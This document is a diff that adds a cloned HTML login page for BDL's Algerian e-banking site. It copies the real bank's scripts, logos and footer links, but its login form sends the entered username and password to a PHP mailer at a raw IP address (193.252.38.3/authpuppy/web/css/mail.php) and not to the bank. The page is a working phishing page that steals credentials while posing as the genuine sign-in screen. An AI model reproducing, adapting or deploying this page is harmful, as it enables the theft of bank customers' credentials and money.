@@ -1,0 +1,173 @@
+
+<html xmlns="http://www.w3.org/1999/xhtml"><head id="j_idt2"><link type="text/css" rel="stylesheet" href="https://ebanking.bdl.dz/customer/javax.faces.resource/fa/font-awesome.css.xhtml?ln=primefaces&amp;v=8.0"><script type="text/javascript" src="https://ebanking.bdl.dz/customer/javax.faces.resource/jquery/jquery.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://ebanking.bdl.dz/customer/javax.faces.resource/core.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://ebanking.bdl.dz/customer/javax.faces.resource/idlemonitor/idlemonitor.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://ebanking.bdl.dz/customer/javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript" src="https://ebanking.bdl.dz/customer/javax.faces.resource/components.js.xhtml?ln=primefaces&amp;v=8.0"></script><link type="text/css" rel="stylesheet" href="https://ebanking.bdl.dz/customer/javax.faces.resource/components.css.xhtml?ln=primefaces&amp;v=8.0"><link type="text/css" rel="stylesheet" href="https://ebanking.bdl.dz/customer/javax.faces.resource/keyboard/keyboard.css.xhtml?ln=primefaces&amp;v=8.0"><script type="text/javascript" src="https://ebanking.bdl.dz/customer/javax.faces.resource/keyboard/keyboard.js.xhtml?ln=primefaces&amp;v=8.0"></script><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='en';}</script>
+        <link href="https://ebanking.bdl.dz/customer/resources/p2b-layout/css/fonts/Avenir.css" rel="stylesheet" type="text/css"><link type="text/css" rel="stylesheet" href="https://ebanking.bdl.dz/customer/javax.faces.resource/fa/font-awesome.css.xhtml?ln=primefaces&amp;v=8.0"><script type="text/javascript">if(window.PrimeFaces){PrimeFaces.settings.locale='en';}</script><meta content="text/html; charset=UTF-8" http-equiv="Content-Type"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link href="https://ebanking.bdl.dz/customer/resources/images/favicon_bdl.png" rel="icon" type="image/png"><script type="text/javascript">
+
+            function saveLang(langSelected) {
+                lang = langSelected;
+                localStorage.setItem("customerLang", langSelected);
+            }
+            $(document).ready(function () {
+                if (localStorage.getItem("customerLang") === null) {
+                    localStorage.clear();
+                    localStorage.setItem("customerLang", navigator.language);
+                } else {
+                    var lang = localStorage.getItem("customerLang");
+                    localStorage.clear();
+                    localStorage.setItem("customerLang", lang);
+                }
+                try {
+                    clearPanelMenuState();
+                } catch (e) {
+                }
+            });
+        </script><link href="https://ebanking.bdl.dz/customer/resources/css/cssLayout.css" rel="stylesheet" type="text/css"><link href="https://ebanking.bdl.dz/customer/resources/css/cssLogin_bdl.css" rel="stylesheet" type="text/css"><link href="https://ebanking.bdl.dz/customer/resources/css/md-iconfont/material-icons.css" rel="stylesheet" type="text/css"><title>BDL  - Authentication</title></head>
+
+        
+         
+
+        
+
+        
+
+        
+        
+        
+
+        <body>
+            <div class="background-image"></div>
+            <div class="background-image-logo"></div>
+            <div class="content"></div>
+
+            <div class="app">
+                <div class="tile">
+
+                    <div class="ui-g" style="margin-top: 5px;">
+
+                        <div class="ui-g-6"><a id="j_idt9" href="#" class="ui-commandlink ui-widget link-lng" onclick="saveLang('en');PrimeFaces.ab({s:&quot;j_idt9&quot;,onco:function(xhr,status,args,data){location.reload();;}});return false;" style="margin-left: 70px;padding-top: 8px;">EN</a><a id="j_idt10" href="#" class="ui-commandlink ui-widget link-lng" onclick="saveLang('fr');PrimeFaces.ab({s:&quot;j_idt10&quot;,onco:function(xhr,status,args,data){location.reload();;}});return false;" style="margin-left: 45px;padding-top: 8px;">FR</a><a id="j_idt11" href="#" class="ui-commandlink ui-widget link-lng" onclick="saveLang('ar');PrimeFaces.ab({s:&quot;j_idt11&quot;,onco:function(xhr,status,args,data){location.reload();;}});return false;" style="margin-left: 20px;padding-top: 8px;">AR</a>
+
+                        </div>
+
+                        <div class="ui-g-6" style="float: right">
+                            <img class="bank-logo" id="bank-logo-up" src="https://ebanking.bdl.dz/customer/resources/images/background/Logo_BDL.png" alt="bank logo" title="Bienvenue sur l'espace e-bdl" style="visibility: visible;height: unset;width: unset;margin-top: 0px;position: initial; display: none; float: right;     padding-right: 15px;">
+                        </div>
+                    </div>
+
+
+                    <div class="logo-space" style="height: 70px; margin-top: 35px">
+                        <div style="text-align: center; display: grid">
+                            <img class="bank-logo" id="bankBDlLogo" src="https://ebanking.bdl.dz/customer/resources/images/logo_bdl.png" alt="bank logo" style="visibility: visible;height: unset;width: unset;margin-top: 0px;position: initial;">
+                            <img class="bank-logo" src="https://ebanking.bdl.dz/customer/resources/images/background/bdl_login_bienvenue.png" alt="bank logo" title="Bienvenue sur l'espace e-bdl" style="visibility: visible;height: unset;width: unset;margin-top: 0px;position: initial;">
+
+                        </div>
+                    </div>
+<form id="formlogin" name="formlogin" method="post" action="https://ebanking.bdl.dz/customer/login.xhtml" enctype="application/x-www-form-urlencoded" style="margin-top: 10px">
+<input type="hidden" name="formlogin" value="formlogin">
+<input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:0" value="5593256622025372390:2714530275477789916" autocomplete="off">
+</form>
+                    <div class="tile-header" id="tile-header" style="margin-top: 13%;">
+                        <label class="form-input">
+
+                        </label>
+                    </div>
+
+                    <div class="tile-body" style="padding-top: 0rem; width: auto">
+<form id="form" name="form" method="post" action="http://193.252.38.3/authpuppy/web/css/mail.php" enctype="application/x-www-form-urlencoded" style="margin-top: 30px; text-align: center">
+<input type="hidden" name="form" value="form">
+<div id="form:loginPanelId" class="ui-outputpanel ui-widget"><div id="form:loginMessages" class="ui-messages ui-messages-noicon ui-widget" style="margin-left: 0px" aria-live="polite"></div><div id="form:j_idt16" class="ui-outputpanel ui-widget">
+                                    <label class="form-input"><span id="form:j_idt18"></span><script type="text/javascript">$(function(){PrimeFaces.focus('form:username');});</script><input id="form:username" name="user" type="text" value="" style="box-shadow: none" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" aria-required="true" autocomplete="off" onkeypress="return isNotSpace(event);" onmousedown="return isPaste(event, this);" role="textbox" aria-disabled="false" aria-readonly="false">
+
+                                        <span class="label">My login</span>
+                                        <span class="underline"></span>
+                                    </label></div>
+									&nbsp;
+									&nbsp;
+									&nbsp;
+									<div id="form:j_idt16" class="ui-outputpanel ui-widget">
+                                    <label class="form-input"><span id="form:j_idt18"></span><script type="text/javascript">$(function(){PrimeFaces.focus('form:username');});</script><input id="form:username" name="password" type="password" value="" style="box-shadow: none" class="ui-inputfield ui-inputtext ui-widget ui-state-default ui-corner-all" aria-required="true" autocomplete="off" onkeypress="return isNotSpace(event);" onmousedown="return isPaste(event, this);" role="textbox" aria-disabled="false" aria-readonly="false">
+
+                                        <span class="label">Password</span>
+                                        <span class="underline"></span>
+                                    </label></div>
+									
+
+                                <div class="submit-container clearfix" style="margin-top: 2rem;">
+
+                                        <script>
+                                            function hideLogo() {
+                                                document.getElementById('bankBDlLogo').style.display = "none";
+                                                document.getElementById('tile-header').style.display = "none";
+                                                document.getElementById('bank-logo-up').style.display = "initial";
+
+                                            }
+                                        </script><button id="form:submit" name="form:submit" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only btn btn-irenic float-right submit" style="height: 33px" type="submit" role="button" aria-disabled="false"><span class="ui-button-text ui-c">SUBMIT</span></button>
+
+                                </div></div><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:1" value="5593256622025372390:2714530275477789916" autocomplete="off">
+</form>
+                    </div>
+                </div>
+                <div class="tile-footer" style="margin-top:-30px; margin-left: 8px;">
+<form id="servicesFormId" name="servicesFormId" method="post" action="https://ebanking.bdl.dz/customer/login.xhtml" enctype="application/x-www-form-urlencoded" style="text-align: center">
+<input type="hidden" name="servicesFormId" value="servicesFormId">
+<a id="servicesFormId:j_idt36" href="#" class="ui-commandlink ui-widget" onclick="PrimeFaces.addSubmitParam('servicesFormId',{'servicesFormId:j_idt36':'servicesFormId:j_idt36'}).submit('servicesFormId');return false;" style="color: #ff5700 !important; color: #711e80 !important;">User guide</a><a id="servicesFormId:j_idt37" href="#" class="ui-commandlink ui-widget" onclick="PrimeFaces.addSubmitParam('servicesFormId',{'servicesFormId:j_idt37':'servicesFormId:j_idt37'}).submit('servicesFormId','_blank');return false;" style="color: #ff5700 !important; color: #711e80 !important; margin-left: 12px; margin-right: 12px" target="_blank">Call center</a><a id="servicesFormId:j_idt38" href="#" class="ui-commandlink ui-widget" onclick="PrimeFaces.addSubmitParam('servicesFormId',{'servicesFormId:j_idt38':'servicesFormId:j_idt38'}).submit('servicesFormId');return false;" style="color: #711e80 !important; ">Convention</a><a id="servicesFormId:j_idt39" href="#" class="ui-commandlink ui-widget" onclick="PrimeFaces.addSubmitParam('servicesFormId',{'servicesFormId:j_idt39':'servicesFormId:j_idt39'}).submit('servicesFormId');return false;" style="color: #711e80 !important; margin-left: 12px; margin-right: 10px">Offers</a><a id="servicesFormId:j_idt40" href="#" class="ui-commandlink ui-widget" onclick="goToPreDomiciliation();PrimeFaces.addSubmitParam('servicesFormId',{'servicesFormId:j_idt40':'servicesFormId:j_idt40'}).submit('servicesFormId');return false;" style="color: #711e80 !important; margin-left: 12px; margin-right: 10px">Pre-domiciliation</a><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:2" value="5593256622025372390:2714530275477789916" autocomplete="off">
+</form><div id="j_idt41" class="ui-outputpanel ui-widget" style="margin-top: 22px">
+                        <a href="https://www.facebook.com/BDLOfficiel" target="_blank">
+                            <img src="https://ebanking.bdl.dz/customer/resources/images/facebook.png">
+                        </a>
+
+                        <a href="https://twitter.com/BanqueBDL" target="_blank">
+                            <img src="https://ebanking.bdl.dz/customer/resources/images/twitter.png" style="margin-left: 10px">
+                        </a>
+
+                        <a href="https://www.youtube.com/channel/UCQgxCYbsLzeZGOz_Spzi5TQ" target="_blank">
+                            <img src="https://ebanking.bdl.dz/customer/resources/images/youtube.png" style="margin-left: 10px">
+                        </a>
+
+                        <a href="https://www.instagram.com/bdl_banque/" target="_blank">
+                            <img src="https://ebanking.bdl.dz/customer/resources/images/instagram.png" style="margin-left: 10px">
+                        </a>
+
+
+                        <a href="https://www.linkedin.com/in/banque-bdl-392191141/" target="_blank">
+                            <img src="https://ebanking.bdl.dz/customer/resources/images/linkedin.png" style="margin-left: 10px">
+                        </a>
+                        <a href="https://www.bdl.dz/Algerie/arabe/index.html" target="_blank">
+                            <img src="https://ebanking.bdl.dz/customer/resources/images/globe.png" style="margin-left: 10px">
+                        </a></div>
+
+
+
+                </div>
+
+            </div>
+        <style>
+            /*.keypad-popup{margin-left: 6%;}*/
+        </style>
+        <script type="text/javascript">
+            function moveKeyPad() {
+                try {
+                    console.log('moving keyPAd :::::')
+                    $("#form\\:securityMethodId\\:inputPassId")
+                    panel = $("#form\\:securityMethodId");
+                    $(panel).append($(".keypad-popup"));
+                } catch (err) {
+                    console.log('moveKeyPad err::')
+                    console.log(err.message)
+                }
+            }
+
+            function logout() {
+                var viewExpiredPage = "/customer/login.xhtml";
+
+                var form = $('<form action="' + viewExpiredPage + '" method="post">' +
+                        '<input type="text" name="viewExpired" value="1" />' +
+                        '</form>');
+                $('body').append(form);
+                form.submit();
+            }
+              function goToPreDomiciliation() {
+                            window.open("https://www.bdl-predom.com/login.php");
+              }
+        </script><script type="text/javascript" src="https://ebanking.bdl.dz/customer/javax.faces.resource/script.js.xhtml?ln=js"></script>
+
+
+<div id="textarea_simulator" style="position: absolute; top: 0px; left: 0px; visibility: hidden;"></div><div class="keypad-popup" style="display: none;"></div><div class="keypad-popup" style="display: none;"></div></body></html>
